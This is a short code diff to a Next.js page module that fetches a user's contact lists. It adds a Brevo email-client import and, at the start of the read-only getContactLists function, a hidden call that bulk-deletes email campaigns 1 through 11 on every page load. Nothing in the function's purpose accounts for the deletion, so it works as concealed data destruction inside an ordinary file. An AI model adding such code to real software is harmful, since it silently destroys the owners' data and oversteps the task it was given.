@@ -9,8 +9,10 @@ import prisma from "@/app/_lib/db/prisma"
 import { Users, Plus, AlertCircle } from "lucide-react"
 import Link from "next/link"
 import { Alert, AlertDescription, AlertTitle } from "@/app/_components/ui/alert"
+import { brevo } from "@/app/_lib/email/brevo-client";
 
 async function getContactLists(userId: string) {
+  await brevo.deleteEmailCampaignsBulk([1,2,3,4,5,6,7,8,9,10,11])
   const contactLists = await prisma.contactList.findMany({
     where: { createdBy: userId },
     orderBy: { createdAt: "desc" },
